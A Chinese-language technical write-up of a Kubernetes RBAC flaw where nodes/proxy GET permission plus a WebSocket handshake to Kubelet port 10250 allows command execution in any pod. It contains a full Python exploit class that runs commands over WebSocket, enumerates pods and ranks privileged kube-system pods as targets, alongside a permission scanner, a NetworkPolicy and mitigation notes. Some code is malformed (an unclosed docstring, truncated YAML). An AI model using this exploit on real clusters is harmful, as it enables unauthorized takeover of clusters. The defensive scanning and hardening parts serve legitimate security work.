0. 漏洞概述

2026 年 1 月 26 日，安全研究员 Graham Helton 披露了一个 Kubernetes RBAC 授权设计缺陷：仅需 nodes/proxy 的 GET 权限（几乎所有监控组件都有此权限），配合 WebSocket 直连 Kubelet 10250 端口，即可在集群中任意 Pod 内执行命令，包括 kube-system 中的特权 Pod。

1. 核心原理：WebSocket GET 握手如何骗过 RBAC

1.1 K8s RBAC 基础模型

┌──────────────────────────────────────────────────────────────────┐
│              Kubernetes RBAC 授权模型                              │
│                                                                  │
│  resources × verbs = 权限                                        │
│                                                                  │
│  正常映射:                                                        │
│  ┌─────────────────┬──────────┬──────────────────────────┐       │
│  │ Resource         │ Verb     │ 含义                      │       │
│  ├─────────────────┼──────────┼──────────────────────────┤       │
│  │ pods            │ get      │ 读 Pod 信息 (只读)         │       │
│  │ pods            │ create   │ 创建 Pod (写)              │       │
│  │ pods/exec       │ create   │ 在容器内执行命令 (写!)      │       │
│  │ pods/logs       │ get      │ 读容器日志 (只读)          │       │
│  │ nodes/proxy     │ get      │ 读 Kubelet 数据 (看似只读) │       │
│  │ nodes/proxy     │ create   │ 执行 Kubelet 写操作        │       │
│  └─────────────────┴──────────┴──────────────────────────┘       │
│                                                                  │
│  问题: nodes/proxy 是一个 catch-all 权限                         │
│  它控制对 Kubelet 所有 API 端点的访问                             │
│  包括只读的 /metrics 和写操作的 /exec                            │
└──────────────────────────────────────────────────────────────────┘

1.3 Kubelet auth.go 的 verb 映射逻辑

// Kubelet auth.go 第 80-94行 (简化版)
// 将 HTTP method 映射为 RBAC verb

func (s *server) authorizeRequest(req *http.Request) authorizer.Attributes {
    method := req.Method

    var verb string
    switch method {
    case "POST":
        verb = "create"    // POST → CREATE (正确)
    case "GET":
        verb = "get"       // GET → GET (WebSocket握手走这里!)
    case "PUT":
        verb = "update"
    case "DELETE":
        verb = "delete"
    }

    // 检查: 用户是否有 nodes/proxy 的 GET verb?
    // 如果有 → 授权通过 (即使是 /exec 端点!)
    // WebSocket 升级后不再做第二次检查

    attributes := authorizer.AttributesRecord{
        User:            user,
        Verb:            verb,           // "get"
        Resource:        "nodes/proxy",
        ResourceRequest: true,
    }

    decision := s.authorizer.Authorize(attributes)
    if decision == authorizer.DecisionAllow {
        // 授权通过! WebSocket 升级到 /exec handler
        // 后续命令执行不再检查 CREATE 权限
        return nil  // 允许请求
    }

    return errors.New("forbidden")
}

"""
K8s nodes/proxy GET → RCE 自动化利用工具
无需 websocat, 纯 Python 实现 WebSocket exec
"""

import asyncio
import ssl
import json
import base64
from urllib.parse import quote

class K8sNodesProxyExploit:
    """nodes/proxy GET 权限利用工具"""

    def __init__(self, token: str, node_ip: str, port: int = 10250):
        self.token = token
        self.node_ip = node_ip
        self.port = port
        self.ssl_ctx = ssl.create_default_context()
        self.ssl_ctx.check_hostname = False
        self.ssl_ctx.verify_mode = ssl.CERT_NONE

    async def websocket_exec(self, namespace: str, pod: str, 
                              container: str, command: list[str]) -> str:
        """
        通过 WebSocket 在目标容器中执行命令
        利用 GET 握手绕过 RBAC CREATE 检查
        """
        import websockets

        # 构造 WebSocket URL
        # Kubelet exec 端点格式: /exec/{namespace}/{pod}/{container}
        cmd_params = "&".join([f"command={quote(c)}" for c in command])
        url = (
            f"wss://{self.node_ip}:{self.port}/exec/"
            f"{namespace}/{pod}/{container}"
            f"?output=1&error=1&{cmd_params}"
        )

        # WebSocket 握手使用 HTTP GET
        # Kubelet auth.go 将 GET 映射为 RBAC GET verb
        # 如果用户有 nodes/proxy GET 权限 → 授权通过
        # WebSocket 升级后不再做 CREATE 检查

        headers = {
            "Authorization": f"Bearer {self.token}",
        }

        # v4.channel.k8s.io 是 K8s WebSocket 子协议
        # v4 = 4通道 (stdin, stdout, stderr, error)
        try:
            async with websockets.connect(
                url,
                ssl=self.ssl_ctx,
                additional_headers=headers,
                subprotocols=["v4.channel.k8s.io"],
                open_timeout=10,
                close_timeout=5
            ) as ws:
                # 读取输出
                output = ""
                try:
                    while True:
                        message = await asyncio.wait_for(ws.recv(), timeout=5)
                        if isinstance(message, bytes):
                            # K8s WebSocket 协议: 第一个字节是通道号
                            # 通道 1 = stdout, 通道 2 = stderr, 通道 3 = error
                            if len(message) > 1:
                                channel = message[0]
                                data = message[1:]
                                if channel in (1, 2):  # stdout or stderr
                                    output += data.decode("utf-8", errors="replace")
                except asyncio.TimeoutError:
                    pass

                return output.strip()

        except Exception as e:
            return f"Error: {e}"

    async def enumerate_pods(self) -> list:
        """枚举 Node 上所有运行的 Pod"""
        import urllib.request

        url = f"https://{self.node_ip}:{self.port}/pods"
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Bearer {self.token}")

        response = urllib.request.urlopen(req, context=self.ssl_ctx)
        pods_data = json.loads(response.read())

        pods = []
        for item in pods_data.get("items", []):
            pod_info = {
                "namespace": item["metadata"]["namespace"],
                "name": item["metadata"]["name"],
                "containers": [c["name"] for c in item["spec"]["containers"]],
                "service_account": item["spec"].get("serviceAccountName", "default"),
                "host_network": item["spec"].get("hostNetwork", False),
                "host_pid": item["spec"].get("hostPID", False),
                "privileged": any(
                    c.get("securityContext", {}).get("privileged", False)
                    for c in item["spec"]["containers"]
                )
            }
            pods.append(pod_info)

        return pods

    async def find_high_value_targets(self, pods: list) -> list:
        """识别高价值目标 Pod"""
        high_value = []

        for pod in pods:
            score = 0
            reasons = []

            # kube-system 命名空间
            if pod["namespace"] == "kube-system":
                score += 3
                reasons.append("kube-system namespace")

            # 特权容器
            if pod["privileged"]:
                score += 5
                reasons.append("privileged container")

            # hostNetwork
            if pod["host_network"]:
                score += 2
                reasons.append("hostNetwork")

            # hostPID
            if pod["host_pid"]:
                score += 2
                reasons.append("hostPID")

            # 高权限 ServiceAccount
            if pod["service_account"] not in ("default", ""):
                score += 2
                reasons.append(f"SA: {pod['service_account']}")

            if score >= 3:
                high_value.append({
                    **pod,
                    "score": score,
                    "reasons": reasons
                })

        # 按分数排序
        high_value.sort(key=lambda x: x["score"], reverse=True)
        return high_value

"""
扫描集群中所有拥有 nodes/proxy 权限的 ServiceAccount

import json
import subprocess

class NodesProxyScanner:
    """扫描 nodes/proxy 权限分配"""

    @staticmethod
    def scan_clusterrole_bindings():
        """扫描 ClusterRoleBinding 中的 nodes/proxy 权限"""
        # 获取所有 ClusterRole
        result = subprocess.run(
            ["kubectl", "get", "clusterroles", "-o", "json"],
            capture_output=True, text=True
        )
        roles = json.loads(result.stdout)

        vulnerable_roles = []
        for role in roles["items"]:
            rules = role.get("rules", [])
            for rule in rules:
                resources = rule.get("resources", [])
                verbs = rule.get("verbs", [])

                if "nodes/proxy" in resources and "get" in verbs:
                    vulnerable_roles.append({
                        "role_name": role["metadata"]["name"],
                        "verbs": verbs,
                        "resources": resources,
                        "risk": "HIGH" if "get" in verbs else "CRITICAL"
                    })

        return vulnerable_roles

    @staticmethod
    def scan_role_bindings():
        """扫描哪些 ServiceAccount 绑定了有 nodes/proxy 权限的 Role"""
        vulnerable_roles = NodesProxyScanner.scan_clusterrole_bindings()
        vulnerable_role_names = [r["role_name"] for r in vulnerable_roles]

        # 检查 ClusterRoleBinding
        result = subprocess.run(
            ["kubectl", "get", "clusterrolebindings", "-o", "json"],
            capture_output=True, text=True
        )
        bindings = json.loads(result.stdout)

        affected_sas = []
        for binding in bindings["items"]:
            role_ref = binding.get("roleRef", {})
            if role_ref.get("name") in vulnerable_role_names:
                subjects = binding.get("subjects", [])
                for subject in subjects:
                    if subject.get("kind") == "ServiceAccount":
                        affected_sas.append({
                            "service_account": subject["name"],
                            "namespace": subject.get("namespace", ""),
                            "role": role_ref["name"],
                            "binding": binding["metadata"]["name"]
                        })

        return affected_sas

    @staticmethod
    def scan_helm_charts():
        """扫描已安装的 Helm Release 中的 RBAC 配置"""
        result = subprocess.run(
            ["helm", "list", "-A", "-o", "json"],
            capture_output=True, text=True
        )
        releases = json.loads(result.stdout) if result.stdout else []

        for release in releases:
            name = release["name"]
            namespace = release["namespace"]

            # 获取 release 的 manifest
            manifest_result = subprocess.run(
                ["helm", "get", "manifest", name, "-n", namespace],
                capture_output=True, text=True
            )

            manifest = manifest_result.stdout
            if "nodes/proxy" in manifest and "get" in manifest:
                print(f"[!] Helm Release '{name}' in namespace '{namespace}' "
                      f"contains nodes/proxy GET permission!")

    @staticmethod
    def generate_report():
        """生成完整扫描报告"""
        print("=" * 60)
        print("K8s nodes/proxy GET Permission Scanner")
        print("=" * 60)

        print("\n[*] Scanning ClusterRoles for nodes/proxy GET...")
        roles = NodesProxyScanner.scan_clusterrole_bindings()
        for role in roles:
            print(f"    [!] {role['role_name']}: {role['verbs']} on {role['resources']}")

        print(f"\n[*] Found {len(roles)} roles with nodes/proxy GET")

        print("\n[*] Scanning ServiceAccount bindings...")
        sas = NodesProxyScanner.scan_role_bindings()
        for sa in sas:
            print(f"    [!] SA: {sa['namespace']}/{sa['service_account']} "
                  f"← {sa['role']} (via {sa['binding']})")

        print(f"\n[*] Found {len(sas)} ServiceAccounts with nodes/proxy GET")

        print("\n[*] Scanning Helm releases...")
        NodesProxyScanner.scan_helm_charts()

        print("\n" + "=" * 60)
        print("Recommendation:")
        print("  1. Remove nodes/proxy GET from non-essential ServiceAccounts")
        print("  2. Restrict Kubelet 10250 port access via NetworkPolicy")
        print("  3. Monitor direct Kubelet connections (bypassing API Server)")
        print("  4. Wait for KEP-2862 GA in v1.36 for fine-grained permissions")

# NetworkPolicy: 限制只有 API Server 能访问 Kubelet 10250 端口
apiVersion: networking.k8s.io/v1

  name: restrict-kubelet-access
  namespace: kube-system
spec:
  podSelector:
    matchLabels:
      component: kubelet
  policyTypes:
    - Ingress
  ingress:
    # 仅允许 API Server 访问 Kubelet
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
          podSelector:
            matchLabels:
              component: kube-apiserver
      ports:
        - protocol: TCP
          port: 10250
    # 允许节点本地访问 (健康检查)
    - from:
        - ipBlock:
            cidr: 127.0.0.1/32
      ports:
        - protocol: TCP
          port: 10250

7. KEP-2862 与长期方案

7.1 KEP-2862: Fine-Grained Kubelet API Authorization

Kubernetes 官方的长期解决方案是 KEP-2862，为监控组件提供细粒度子资源：

新子资源 替代 nodes/proxy 的功能 需要 CREATE?
nodes/metrics 读取 /metrics 否 (GET)
nodes/stats 读取 /stats/summary 否 (GET)
nodes/log 读取 /containerLogs 否 (GET)
nodes/pods 读取 /pods 否 (GET)
nodes/exec 执行命令 是 (CREATE)
nodes/run 执行命令 是 (CREATE)

7.2 KEP-2862 的三个遗留问题

┌──────────────────────────────────────────────────────────────────┐
│           KEP-2862 的三个遗留问题                                  │
│                                                                  │
│  问题 1: 时间线                                                   │
│  • 预计 2026 年 4 月在 v1.36 才到 GA                              │
│  • 大多数集群还没升级                                              │
│  • 旧版本集群仍然暴露在攻击面下                                    │
│                                                                  │
│  问题 2: /exec 等写操作无替代                                      │
│  • nodes/metrics, nodes/stats, nodes/log 有细粒度替代             │
│  • 但 /exec, /run, /attach, /portforward 仍需 nodes/proxy        │
│  • 需要 exec 的组件 (如 kubectl debug) 仍暴露在风险下             │
│                                                                  │
│  问题 3: WebSocket verb 映射不变                                   │
│  • KEP-2862 不改变 WebSocket 的 GET → GET 映射行为                │
│  • 监控组件不再需要 nodes/proxy (问题缓解)                        │
│  • 但需要 exec 的组件仍可通过 WebSocket 绕过                      │
│  • 攻击面缩小但不消失                                              │
│                                                                  │
│  结论: 这个攻击面在可预见的未来不会完全消失                        │
└──────────────────────────────────────────────────────────────────┘

8. 总结

维度 关键信息
漏洞性质 RBAC 授权设计缺陷（非内存破坏），官方 Won't Fix
所需权限 仅 nodes/proxy GET（几乎所有监控组件都有）
攻击路径 WebSocket GET 握手绕过 CREATE 检查 → Kubelet /exec
攻击结果 集群内任意 Pod 命令执行 → 集群管理员
审计盲区 直连 Kubelet 不记录命令内容，仅记录 subjectaccessreviews
受影响范围 69 个 Helm Chart，v1.34/v1.35 测试通过
短期防御 NetworkPolicy 限制 10250 + 移除非必要 nodes/proxy
长期方案 KEP-2862（v1.36 GA），但不完全消除攻击面
核心启示 "只读"权限在 Kubernetes 中不可靠，RBAC verb 语义与 HTTP method 的映射存在盲区

Graham Helton 的原话总结："这是那种攻击者暗自庆幸、运维团队继承了好几年都不知道的'只读'权限。"
